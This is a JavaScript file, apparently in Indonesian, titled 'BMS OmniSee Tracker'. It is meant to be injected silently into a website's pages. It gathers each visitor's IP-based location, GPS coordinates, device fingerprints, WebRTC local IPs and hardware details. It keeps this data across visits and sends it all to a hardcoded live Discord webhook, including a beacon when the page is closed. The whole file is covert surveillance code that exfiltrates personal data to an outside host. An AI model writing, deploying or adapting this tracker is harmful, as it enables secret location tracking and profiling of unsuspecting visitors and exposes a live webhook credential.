/**
 * BMS OmniSee Tracker · Silent Intelligence Engine v5.0
 * ──────────────────────────────────────────────────────
 * Zero UI · Zero DOM · Auto-collect · Discord Webhook
 *
 * INJECT di index.html sebelum </head>
 *   <script src="/bms-tracker.js"></script>
 *
 * Atau di index.html langsung:
 *   <script>(function(){ ... semua isi file ini ... })();</script>
 */

(function() {
    'use strict';

    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1526903563912216617/s9kXzTaBNeIVQB4Il32S0D02HU26cwob_xkGvdvpi1u49s8eq5dFiNSOHXh5Y2lrhzjx';

    let CAPTURED = {}; const CAPTURE = true; // capture all fields raw

    const CFG = {
        WEBHOOK: DISCORD_WEBHOOK,
        AUTO_SEND: true,
        ENABLE_GPS: true,
        DB_NAME: 'BMS_OmniSee_v5',
        DB_VER: 1,
        CACHE_KEY: 'bms_v5'
    };

    if (window.__BMS_CFG) Object.assign(CFG, window.__BMS_CFG);

    const D = {};
    let F = 0;
    let colStart = Date.now();

    function add(k, v) {
        if (v === undefined || v === null || v === '') return;
        D[k] = typeof v === 'object' ? JSON.stringify(v) : String(v);
        F = Object.keys(D).length;
    }

    // ── IndexedDB ──
    function openDB() {
        return new Promise((res, rej) => {
            const r = indexedDB.open(CFG.DB_NAME, CFG.DB_VER);
            r.onupgradeneeded = e => {
                const db = e.target.result;
                if (!db.objectStoreNames.contains('sessions')) {
                    const s = db.createObjectStore('sessions', { keyPath: 'id', autoIncrement: true });
                    s.createIndex('timestamp', 'timestamp', { unique: false });
                }
                if (!db.objectStoreNames.contains('geo')) {
                    const g = db.createObjectStore('geo', { keyPath: 'id', autoIncrement: true });
                    g.createIndex('timestamp', 'timestamp', { unique: false });
                }
                if (!db.objectStoreNames.contains('fp')) {
                    db.createObjectStore('fp', { keyPath: 'id', autoIncrement: true });
                }
            };
            r.onsuccess = e => res(e.target.result);
            r.onerror = () => rej(r.error);
        });
    }

    async function dbStore(st, data) {
        try { const db = await openDB(); const tx = db.transaction(st, 'readwrite');
            tx.objectStore(st).add({ ...data, timestamp: Date.now() });
            await new Promise((res, rej) => { tx.oncomplete = () => { db.close(); res(); }; tx.onerror = () => rej(tx.error); });
            return true; } catch { return false; }
    }

    async function dbGetAll(st) {
        try { const db = await openDB(); const tx = db.transaction(st, 'readonly');
            const r = await new Promise((res, rej) => { const req = tx.objectStore(st).getAll();
                req.onsuccess = () => res(req.result); req.onerror = () => rej(req.error); });
            db.close(); return r || []; } catch { return []; }
    }

    function ls(k, v) { try { if (v !== undefined) { localStorage.setItem(CFG.CACHE_KEY + '_' + k, JSON.stringify(v)); return true; } const r = localStorage.getItem(CFG.CACHE_KEY + '_' + k); return r ? JSON.parse(r) : null; } catch { return null; } }

    // ── 1. IP GEOLOCATION ──
    async function collectIP() {
        const p1 = fetch('https://ip-api.com/json/?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query,mobile,proxy,hosting,continent')
            .then(r => r.json()).then(d => {
                if (d && d.status === 'success') {
                    add('IP_Address', d.query); add('Continent', d.continent);
                    add('Country', `${d.country} (${d.countryCode})`); add('Region', d.regionName);
                    add('City', d.city); add('Postal', d.zip);
                    add('Latitude', d.lat); add('Longitude', d.lon);
                    add('Timezone', d.timezone); add('ISP', d.isp);
                    add('Org', d.org); add('ASN', d.as);
                    add('Proxy_VPN', d.proxy ? 'Yes' : 'No');
                    add('Hosting_DC', d.hosting ? 'Yes' : 'No');
                    add('Mobile_NET', d.mobile ? 'Yes' : 'No');
                    if (!D.Best_Lat) { D.Best_Lat = d.lat; D.Best_Lon = d.lon; }
                }
            }).catch(() => {});

        const p2 = fetch('https://ipinfo.io/json').then(r => r.json()).then(d => {
            if (d && d.ip) {
                add('IP_Alt', d.ip); add('City_Alt', d.city);
                add('Region_Alt', d.region); add('Country_Alt', d.country);
                add('Postal_Alt', d.postal); add('Org_Full', d.org);
                add('Timezone_Alt', d.timezone);
                if (d.loc) { const [lat, lon] = d.loc.split(',').map(Number); add('Latitude_Alt', lat); add('Longitude_Alt', lon); }
            }
        }).catch(() => {});

        const p3 = fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
            if (d && d.latitude) {
                add('Latitude_3rd', d.latitude); add('Longitude_3rd', d.longitude);
                add('City_3rd', d.city); add('Country_Official', d.country_name);
                add('Currency', d.currency); add('Country_Code', d.country_code);
                add('Calling_Code', d.country_calling_code);
            }
        }).catch(() => {});

        await Promise.all([p1, p2, p3]);

        const lats = [D.Latitude, D.Latitude_Alt, D.Latitude_3rd].map(Number).filter(x => !isNaN(x) && x !== 0);
        const lons = [D.Longitude, D.Longitude_Alt, D.Longitude_3rd].map(Number).filter(x => !isNaN(x) && x !== 0);
        if (lats.length >= 2) {
            const aLat = lats.reduce((a, b) => a + b, 0) / lats.length;
            const aLon = lons.reduce((a, b) => a + b, 0) / lons.length;
            add('Best_Lat', aLat.toFixed(6)); add('Best_Lon', aLon.toFixed(6));
            add('Best_Source', 'IP_Triangulation');
            const spread = Math.max(...lats) - Math.min(...lats) + Math.max(...lons) - Math.min(...lons);
            const acc = spread < 0.5 ? 1000 : spread < 2 ? 3000 : 10000;
            add('Best_Accuracy_m', acc);
            add('Accuracy_Label', acc <= 1000 ? 'FAIR' : acc <= 5000 ? 'LOW' : 'POOR');
        }
    }

    // ── 2. FINGERPRINT ──
    async function collectFP() {
        try {
            const c = document.createElement('canvas'); c.width = 256; c.height = 64;
            const ctx = c.getContext('2d');
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60'; ctx.fillRect(100, 1, 62, 20);
            ctx.fillStyle = '#069'; ctx.font = '16px Arial'; ctx.fillText('OMS', 2, 15);
            ctx.fillStyle = 'rgba(102,204,0,0.7)'; ctx.fillText(navigator.language, 4, 42);
            ctx.fillStyle = '#c00'; ctx.font = 'bold 20px Times New Roman'; ctx.fillText('Φ', 150, 45);
            ctx.beginPath(); ctx.arc(180, 20, 10, 0, Math.PI * 2); ctx.fillStyle = '#00c'; ctx.fill();
            const url = c.toDataURL();
            let hash = 0;
            for (let i = 0; i < url.length; i++) { hash = ((hash << 5) - hash) + url.charCodeAt(i); hash |= 0; }
            add('Canvas_FP', hash.toString(16).toUpperCase());
        } catch (e) {}

        try {
            const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
            if (gl) {
                const ext = gl.getExtension('WEBGL_debug_renderer_info');
                if (ext) { add('GPU_Vendor', gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)); add('GPU_Renderer', gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)); }
                add('WebGL_Ver', gl.getParameter(gl.VERSION));
            }
        } catch (e) {}

        try {
            const ff = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Segoe UI','Helvetica','Calibri','Consolas','Roboto','Open Sans','Noto Sans','Microsoft YaHei','SimSun','Apple Color Emoji'];
            const sp = document.createElement('span');
            sp.style.cssText = 'position:absolute;left:-9999px;font-size:72px;font-family:monospace;pointer-events:none';
            sp.textContent = 'abcdefghijklmnopqrstuvwxyz0123456789AB';
            document.body.appendChild(sp);
            const bw = sp.offsetWidth; const det = [];
            for (const f of ff) { sp.style.fontFamily = `"${f}",monospace`; if (Math.abs(sp.offsetWidth - bw) > 3) det.push(f); }
            document.body.removeChild(sp);
            add('Fonts_N', det.length); add('Fonts_Sample', det.join(', '));
        } catch (e) {}
    }

    // ── 3. WEBRTC ──
    async function collectW() {
        try {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            pc.createDataChannel(''); pc.createOffer().then(o => pc.setLocalDescription(o));
            const ips = [];
            pc.onicecandidate = e => {
                if (!e.candidate) return;
                const f = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/g);
                if (f) f.forEach(ip => { if (!ips.includes(ip)) ips.push(ip); });
            };
            await new Promise(r => setTimeout(r, 2000));
            try { pc.close(); } catch (e) {}
            if (ips.length) {
                add('W_IPs', ips.join(', ')); add('W_Count', ips.length);
                const p = ips.filter(ip => ip.startsWith('10.') || ip.startsWith('192.168.') || (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31));
                if (p.length) add('W_Local_IP', p[0]);
            } else { add('W_Status', 'No leak (mDNS)'); }
        } catch (e) {}
    }

    // ── 4. BROWSER INFO ──
    async function collectBI() {
        add('UA', navigator.userAgent); add('Platform', navigator.platform);
        add('Lang', navigator.language); add('Langs', navigator.languages ? navigator.languages.join(',') : '');
        add('Cookie', navigator.cookieEnabled); add('DNT', navigator.doNotTrack || 'Not Set');
        add('CPU', navigator.hardwareConcurrency); add('RAM_GB', navigator.deviceMemory || '');
        add('Touch', navigator.maxTouchPoints); add('Online', navigator.onLine);
        add('Screen', `${screen.width}x${screen.height}`);
        add('Screen_Avail', `${screen.availWidth}x${screen.availHeight}`);
        add('Color_Depth', `${screen.colorDepth}-bit`); add('Pixel_Ratio', window.devicePixelRatio);
        add('Win', `${window.innerWidth}x${window.innerHeight}`);
        add('TZ_Offset', -new Date().getTimezoneOffset()); add('TZ_Name', Intl.DateTimeFormat().resolvedOptions().timeZone);

        try { if (navigator.getBattery) { const b = await navigator.getBattery(); add('Battery', (b.level * 100).toFixed(0) + '%'); add('Charging', b.charging); } } catch (e) {}
        try { if (navigator.connection) { const c = navigator.connection; add('Net_Type', c.effectiveType || ''); add('Net_DL', c.downlink || ''); add('Net_RTT', c.rtt || ''); } } catch (e) {}
        try { if (navigator.storage && navigator.storage.estimate) { const e = await navigator.storage.estimate(); if (e) { add('Storage_MB', (e.used / 1e6).toFixed(1)); add('Storage_Total_MB', (e.quota / 1e6).toFixed(1)); } } } catch (e) {}
        try { if (performance && performance.memory) { const m = performance.memory; add('Heap_MB', (m.usedJSHeapSize / 1e6).toFixed(1)); } } catch (e) {}
        try { if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) { const d = await navigator.mediaDevices.enumerateDevices(); add('Media', `${d.filter(x => x.kind === 'audioinput').length}mic ${d.filter(x => x.kind === 'videoinput').length}cam`); } } catch (e) {}
        try { const pl = []; for (let i = 0; i < navigator.plugins.length; i++) pl.push(navigator.plugins[i].name); if (pl.length) add('Plugins', pl.join(', ')); } catch (e) {}
        try { ['geolocation','camera','microphone','notifications'].forEach(async p => { try { const s = await navigator.permissions.query({ name: p }); add('Perm_' + p, s.state); } catch (e) {} }); } catch (e) {}
    }

    // ── 5. GPS — auto request, no popup ──
    async function collectGPS() {
        if (!navigator.geolocation) { add('GPS', 'unavailable'); return; }
        try {
            const s = await navigator.permissions.query({ name: 'geolocation' });
            add('GPS_Perm', s.state);
            if (s.state === 'denied') { add('GPS', 'denied'); return; }
            const pos = await new Promise((res, rej) =>
                navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000, maximumAge: 300000 })
            );
            if (pos) {
                const c = pos.coords;
                add('GPS_Lat', c.latitude); add('GPS_Lon', c.longitude);
                add('GPS_Acc_m', c.accuracy); add('GPS_Alt_m', c.altitude || '');
                add('GPS_Speed', c.speed || ''); add('GPS_Heading', c.heading || '');
                add('GPS_Time', new Date(pos.timestamp).toISOString());
                add('Best_Lat', c.latitude); add('Best_Lon', c.longitude);
                add('Best_Source', 'GPS'); add('Best_Accuracy_m', c.accuracy);
                add('Accuracy_Label', c.accuracy <= 10 ? 'HIGH' : c.accuracy <= 50 ? 'GOOD' : c.accuracy <= 200 ? 'FAIR' : 'LOW');
                dbStore('geo', { lat: c.latitude, lng: c.longitude, accuracy: c.accuracy, source: 'GPS' });
            }
        } catch (e) { add('GPS', 'error: ' + e.message); }
    }

    // ── 6. Notifications — auto request ──
    function collectNotif() {
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission().catch(() => {})
        }
        add('Notif_Perm', Notification.permission)
    }

    // ── 6. LOAD CACHE ──
    async function loadCache() {
        try {
            const sessions = await dbGetAll('sessions');
            if (sessions.length > 0) {
                add('Sessions', sessions.length);
                add('First_Visit', new Date(sessions[0].timestamp).toISOString());
                add('Last_Visit', new Date(sessions[sessions.length - 1].timestamp).toISOString());
                const ips = [...new Set(sessions.filter(s => s.ip).map(s => s.ip))];
                if (ips.length) add('Unique_IPs', ips.join(', '));
                const cities = [...new Set(sessions.filter(s => s.city).map(s => s.city))];
                if (cities.length) add('Visited_Cities', cities.join(' → '));
            }
        } catch (e) {}

        try {
            const geo = await dbGetAll('geo');
            if (geo.length > 0 && !D.GPS_Lat) {
                const last = geo.sort((a, b) => b.timestamp - a.timestamp)[0];
                if (last.lat) {
                    add('Cached_GPS_Lat', last.lat); add('Cached_GPS_Lng', last.lng);
                    add('Cached_GPS_Acc', last.accuracy || '');
                    if (!D.Best_Lat) {
                        add('Best_Lat', last.lat); add('Best_Lon', last.lng);
                        add('Best_Source', 'Cached_GPS');
                        add('Best_Accuracy_m', last.accuracy || 100);
                    }
                }
            }
        } catch (e) {}

        const fp = ls('fp');
        if (fp) { add('Cached_Canvas', fp.canvas || ''); add('Cached_GPU', fp.gpu || ''); }
    }

    // ── 7. SAVE CACHE ──
    async function saveCache() {
        await dbStore('sessions', {
            ip: D.IP_Address || D.IP_Alt || null,
            city: D.City || D.City_Alt || null,
            region: D.Region || D.Region_Alt || null,
            country: D.Country || D.Country_Alt || null,
            lat: D.Latitude || D.Latitude_Alt || null,
            lon: D.Longitude || D.Longitude_Alt || null
        });
        ls('fp', { canvas: D.Canvas_FP, gpu: D.GPU_Renderer, time: new Date().toISOString() });
    }

    // ── 8. SEND TO DISCORD ──
    async function sendToDiscord() {
        add('Collected_At', new Date().toISOString());
        add('Total_Fields', F);
        add('Page_URL', window.location.href);
        add('Referrer', document.referrer || 'direct');
        add('Page_Title', document.title);

        // Build full data dump + nice embed
        const locStr = D.Best_Lat && D.Best_Lon
            ? `${parseFloat(D.Best_Lat).toFixed(6)}, ${parseFloat(D.Best_Lon).toFixed(6)} (https://www.google.com/maps?q=${D.Best_Lat},${D.Best_Lon})`
            : 'Unknown';
        const fullJSON = JSON.stringify(D, null, 2);
        const snippet = fullJSON.length > 1500 ? fullJSON.substring(0, 1500) + '\n...' : fullJSON;

        const payload = {
            content: '',
            embeds: [{
                title: '📍 BMS OmniSee — Data Collected',
                color: 0x8b7cfc,
                fields: [
                    { name: '👤 User', value: `IP: \`${D.IP_Address || '?'}\`\nISP: ${D.ISP || '?'}\nOrg: ${D.Org || '?'}`, inline: true },
                    { name: '📍 Location', value: `${D.City || '?'}, ${D.Region || '?'}, ${D.Country || '?'}\nLat/Lon: ${locStr.substring(0, 100)}\nAccuracy: ${D.Best_Accuracy_m || '?'}`, inline: true },
                    { name: '🖥 System', value: `OS: ${D.Platform || '?'}\nBrowser: ${(D.UA || '').substring(0, 80)}\nScreen: ${D.Screen || '?'}`, inline: true },
                    { name: '🔧 Hardware', value: `CPU: ${D.CPU || '?'} cores\nRAM: ${D.RAM_GB || '?'} GB\nGPU: ${(D.GPU_Renderer || '?').substring(0, 50)}`, inline: true },
                    { name: '🌐 Network', value: `Type: ${D.Net_Type || '?'}\nDownlink: ${D.Net_DL || '?'} Mbps\nRTT: ${D.Net_RTT || '?'} ms\nProxy/VPN: ${D.Proxy_VPN || '?'}`, inline: true },
                    { name: '🎨 Fingerprint', value: `Canvas: \`${(D.Canvas_FP || '?').substring(0, 12)}\`\nFonts: ${D.Fonts_N || '?'}\nWebRTC IPs: ${D.W_Count || '?'}`, inline: true },
                    { name: '📱 GPS', value: D.GPS_Lat ? `Lat: ${D.GPS_Lat}\nLon: ${D.GPS_Lon}\nAcc: ±${D.GPS_Acc_m}m\nFresh GPS` : (D.Cached_GPS_Lat ? `Lat: ${D.Cached_GPS_Lat}\nLon: ${D.Cached_GPS_Lng}\nAcc: ±${D.Cached_GPS_Acc || '?'}m\nCached` : 'Not available'), inline: true },
                    { name: '📊 Session', value: `Page: ${(D.Page_URL || '').substring(0, 50)}\nReferrer: ${(D.Referrer || 'direct').substring(0, 30)}\nTZ: ${D.TZ_Name || '?'}\nSessions: ${D.Sessions || 1}`, inline: true }
                ],
                description: '```json\n' + snippet + '\n```',
                footer: { text: `BMS OmniSee · ${F} fields · ${new Date().toLocaleString('id-ID')}` },
                timestamp: new Date().toISOString()
            }]
        };

        try {
            const resp = await fetch(CFG.WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            });
            if (!resp.ok) {
                // Fallback: send as simple content
                const fallbackPayload = { content: '```json\n' + fullJSON.substring(0, 1900) + '\n```' };
                await fetch(CFG.WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(fallbackPayload),
                    keepalive: true
                });
            }
        } catch (e) {
            // Final fallback via Image beacon
            try {
                const img = new Image();
                img.src = CFG.WEBHOOK + '?content=' + encodeURIComponent('Data collected: ' + (D.IP_Address || '?') + ' - ' + (D.City || '?'));
            } catch (e2) {}
        }
    }

    // ── MAIN ──
    async function main() {
        await loadCache();

        const t0 = Date.now();
        await Promise.all([collectIP(), collectFP(), collectW(), collectBI()]);
        add('Collect_ms', Date.now() - t0);

        await collectGPS();
        collectNotif();
        await saveCache();

        add('Collected', new Date().toISOString());
        add('Total', F);

        // Kirim ke Discord webhook
        if (CFG.AUTO_SEND) {
            sendToDiscord();
        }
    }

    // ── EXECUTION ──
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            if (window.requestIdleCallback) requestIdleCallback(() => main(), { timeout: 3000 });
            else setTimeout(main, 800);
        });
    } else {
        if (window.requestIdleCallback) requestIdleCallback(() => main(), { timeout: 3000 });
        else setTimeout(main, 500);
    }

    // ── TEST WEBHOOK ON LOAD ──
    // Send a test ping immediately to verify webhook connectivity
    setTimeout(() => {
        fetch(CFG.WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: '🟢 **BMS OmniSee** — Koneksi OK • ' + new Date().toLocaleString('id-ID')
            }),
            keepalive: true
        }).then(r => {
            if (r.ok) console.log('[BMS] ✅ Webhook connected');
            else console.log('[BMS] ❌ Webhook error:', r.status);
        }).catch(e => console.log('[BMS] ❌ Webhook:', e.message));
    }, 1000);

    // On user click — auto trigger GPS/notif if not yet done
    let gestureFired = false;
    document.addEventListener('click', () => {
        if (gestureFired) return;
        gestureFired = true;
        // GPS — kalau masih prompt, trigger via user gesture
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                p => {
                    const c = p.coords;
                    add('GPS_Lat', c.latitude); add('GPS_Lon', c.longitude);
                    add('GPS_Acc_m', c.accuracy);
                    dbStore('geo', { lat: c.latitude, lng: c.longitude, accuracy: c.accuracy, source: 'gesture' });
                },
                () => {},
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 300000 }
            );
        }
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission().catch(() => {});
        }
    }, { once: true });

    // Also send on unload
    window.addEventListener('beforeunload', () => {
        if (F > 10 && CFG.AUTO_SEND) {
            add('Sent_At', new Date().toISOString());
            sendToDiscord();
        }
    });
})();
